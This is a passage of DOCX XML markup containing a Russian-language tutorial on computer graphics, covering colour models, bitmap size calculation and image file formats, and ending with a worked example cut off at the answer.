      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Векторная графика</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> представляет изображение как набор математических объектов (примитивов): линий, кривых, многоугольников, окружностей. Каждый объект описывается математическими формулами и параметрами.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Например, окружность описывается координатами центра, радиусом, цветом контура и заливки:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Окружность: центр = (100, 150), радиус = 50, цвет = RGB(255, 0, 0)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Преимущества векторной графики:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ Масштабируемость без потери качества</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ Малый объём данных (описание формулами компактнее растра)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ Возможность редактирования отдельных объектов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ Независимость от разрешения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Недостатки векторной графики:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>⚠️ Не подходит для фотореалистичных изображений</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>⚠️ Сложность описания сложных изображений</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>⚠️ Требуется растеризация для отображения на экране</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Области применения:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Растровая графика           | Векторная графика              |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| --------------------------- | ------------------------------ |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Фотографии                  | Логотипы компаний              |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Сканированные документы     | Диаграммы и схемы              |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Веб-графика (сложная)       | Иконки интерфейсов             |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Цифровая живопись           | Чертежи и технические рисунки  |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Текстуры для 3D             | Карты и географические данные  |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Медицинские снимки          | Шрифты (TrueType, OpenType)    |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Цветовые модели</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Для описания цвета пикселя в растровой графике используются различные </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>цветовые модели</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — способы математического представления цвета.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Модель RGB (Red-Green-Blue)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>RGB</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — аддитивная (сложение цветов) модель, основанная на смешении трёх основных цветов: красного (Red), зелёного (Green) и синего (Blue). Используется в устройствах, излучающих свет: мониторах, телевизорах, проекторах.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Каждый компонент (R, G, B) задаётся числом:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>При 8 битах на канал: 0–255 (256 градаций)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>При 16 битах на канал: 0–65535</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры цветов в RGB (8 бит на канал):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Чёрный: RGB(0, 0, 0)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Белый: RGB(255, 255, 255)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Красный: RGB(255, 0, 0)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Жёлтый: RGB(255, 255, 0)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Серый (50%): RGB(127, 127, 127)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Глубина цвета в RGB:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Глубина  | Бит на пиксель | Описание                                                       |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| -------- | -------------- | -------------------------------------------------------------- |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 8 бит    | 8              | 256 цветов (палитра, по 3-3-2 бита на R-G-B)                  |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 16 бит   | 16             | High Color (по 5-6-5 бит на R-G-B) = 65 536 цветов            |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 24 бит   | 24             | True Color (по 8 бит на R-G-B) = 16 777 216 цветов            |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 32 бит   | 32             | True Color + Alpha (8 бит на прозрачность)                    |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 48 бит   | 48             | Deep Color (по 16 бит на R-G-B) для профессиональной обработки |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Модель CMYK (Cyan-Magenta-Yellow-blacK)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>CMYK</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — субтрактивная (вычитание цветов) модель, основанная на смешении четырёх красок: голубой (Cyan), пурпурной (Magenta), жёлтой (Yellow) и чёрной (blacK). Используется в полиграфии для печати.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Каждый компонент задаётся в процентах от 0% (цвет отсутствует) до 100% (максимальная интенсивность).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Почему используется чёрный?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Теоретически чёрный получается смешением C+M+Y, но на практике получается тёмно-коричневый, а чёрная краска даёт более насыщенный чёрный цвет и экономит цветные краски.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Модель HSV/HSB (Hue-Saturation-Value/Brightness)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>HSV</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — модель, описывающая цвет через три компонента:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Hue (оттенок)** — цвет на цветовом круге (0°–360°)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Saturation (насыщенность)** — интенсивность цвета (0%–100%)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Value (яркость)** — светлота (0%–100%)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Эта модель более интуитивна для человека, чем RGB, и часто используется в графических редакторах для выбора цвета.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Модель Grayscale (оттенки серого)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Grayscale</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — монохромная модель, где каждый пиксель имеет только яркость (градацию серого) без цветовой информации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>1 бит: чёрно-белое (2 значения)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>8 бит: 256 оттенков серого</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>16 бит: 65 536 оттенков (медицинская визуализация)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Расчёт объёма растрового изображения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Объём несжатого растрового изображения рассчитывается по формуле:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>V = (W × H × D) / 8</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>где:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**V** — объём в байтах</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**W** — ширина в пикселях</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**H** — высота в пикселях</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**D** — глубина цвета в битах на пиксель</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**/8** — перевод из битов в байты</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Для изображения с альфа-каналом (прозрачностью) добавляются дополнительные биты на пиксель.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Форматы графических файлов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Растровые форматы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>BMP (Bitmap)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>BMP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — базовый формат Windows, обычно хранит несжатые данные.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Простая структура</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Большой размер файла (нет сжатия или слабое RLE-сжатие)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Поддержка глубины 1, 4, 8, 16, 24, 32 бита</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Применение: временные файлы, обмен между программами</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>PNG (Portable Network Graphics)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>PNG</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — современный формат со сжатием без потерь, разработанный как альтернатива GIF.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сжатие без потерь (алгоритм Deflate)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Поддержка прозрачности (альфа-канал 8 или 16 бит)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Глубина цвета до 48 бит (по 16 бит на канал RGB)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Поддержка индексированных цветов (палитра)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Применение: веб-графика с прозрачностью, иконки, скриншоты</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Типовые коэффициенты сжатия:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 1.5–3× (зависит от содержимого)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>JPEG (Joint Photographic Experts Group)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>JPEG</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — формат со сжатием с потерями, оптимизированный для фотографий.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сжатие с потерями (алгоритм DCT)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Регулируемое качество (обычно 0–100%)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нет поддержки прозрачности</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Глубина цвета 24 бита (8 бит на канал)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Применение: фотографии, веб-графика с плавными переходами</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Типовые коэффициенты сжатия:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 10–20× при хорошем качестве, до 100× при низком</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Недостатки:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> артефакты сжатия (блоки 8×8), не подходит для текста и графики с чёткими линиями.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>GIF (Graphics Interchange Format)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>GIF</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — старый формат с ограниченной палитрой, поддержкой анимации и прозрачности.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Палитра 256 цветов (8 бит)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сжатие без потерь (алгоритм LZW)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Поддержка прозрачности (1 бит — есть/нет)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Поддержка анимации (последовательность кадров)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Применение: простая анимация, иконки (устаревает)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ограничения:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> только 256 цветов, не подходит для фотографий.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>WebP</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>WebP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — современный формат от Google, поддерживающий сжатие с потерями и без, прозрачность и анимацию.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сжатие с потерями и без потерь</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Поддержка альфа-канала</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Лучшее сжатие, чем JPEG и PNG (на 25–35%)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Применение: современная веб-графика</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>TIFF (Tagged Image File Format)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>TIFF</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — профессиональный формат для хранения изображений без потерь.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Гибкая структура (теги)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Поддержка различных сжатий (LZW, ZIP, нет сжатия)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Глубина цвета до 64 бит</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Многостраничность (TIFF может хранить несколько изображений)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Применение: полиграфия, архивирование, медицина, научная визуализация</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Векторные форматы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>SVG (Scalable Vector Graphics)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SVG</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — открытый XML-формат для веб-векторной графики.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Текстовый формат (можно редактировать в текстовом редакторе)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Поддержка интерактивности (JavaScript, CSS)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Масштабируемость без потери качества</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Применение: веб-иконки, логотипы, диаграммы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>AI (Adobe Illustrator)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>AI</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — проприетарный формат Adobe Illustrator.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Применение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> профессиональный дизайн, логотипы, иллюстрации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>EPS (Encapsulated PostScript)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>EPS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — универсальный векторный формат на основе языка PostScript.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Применение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> обмен между графическими программами, полиграфия.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>PDF (Portable Document Format)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>PDF</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — может содержать как векторные, так и растровые данные.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Применение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> документы, печать, архивирование.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Практические примеры</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 1: Расчёт объёма несжатого изображения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Рассчитайте объём несжатого изображения разрешением 1920×1080 пикселей с глубиной цвета 24 бита (True Color RGB).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Используем формулу:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>V = (W × H × D) / 8</w:t>
        <w:br/>
        <w:t>V = (1920 × 1080 × 24) / 8</w:t>
        <w:br/>
        <w:t>V = (2 073 600 × 24) / 8</w:t>
        <w:br/>
        <w:t>V = 49 766 400 / 8</w:t>
        <w:br/>
        <w:t>V = 6 220 800 байт</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Переведём в мегабайты:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>V = 6 220 800 / (1024 × 1024)</w:t>
        <w:br/>
        <w:t>V ≈ 5,93 МБ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
